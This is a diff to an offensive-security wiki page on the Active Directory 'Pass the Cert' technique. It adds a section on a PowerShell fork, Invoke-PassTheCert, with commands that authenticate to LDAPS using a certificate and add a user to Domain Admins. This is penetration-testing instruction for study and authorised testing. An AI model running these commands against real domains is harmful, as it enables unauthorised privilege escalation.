@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, ThePirateWhoSmellsOfSunflowers
+authors: ShutdownRepo, ThePirateWhoSmellsOfSunflowersn jamarir
 category: ad
 ---
 
@@ -45,6 +45,21 @@ Pass the cert technique can be done with [PassTheCert](https://github.com/Almond
 ```bash
 # Add simple_user to Domain Admins (it assumes that the domain account for which the certificate was issued, holds privileges to add user to this group)
 .\PassTheCert.exe --server fqdn.domain.local --cert-path Z:\cert.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=domain,DC=local" --account "CN=simple_user,CN=Users,DC=domain,DC=local"
+```
+
+It can also be done with this [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork (PowerShell version).
+
+> Note: the [README](https://github.com/jamarir/Invoke-PassTheCert/blob/main/README.md) contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash), and provide numerous actions (e.g. raw LDAP queries, Shadow Credentials enumeration & exploitation, DnsRecords enumeration, etc.)
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+# Perform an action, e.g. add simple_user to Domain Admins (assuming the account authenticated with the certificate is allowed to do so).
+Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection $LdapConnection -Identity 'CN=simple_user,CN=Users,DC=domain,DC=local' -GroupDN 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
 ```
 
 :::
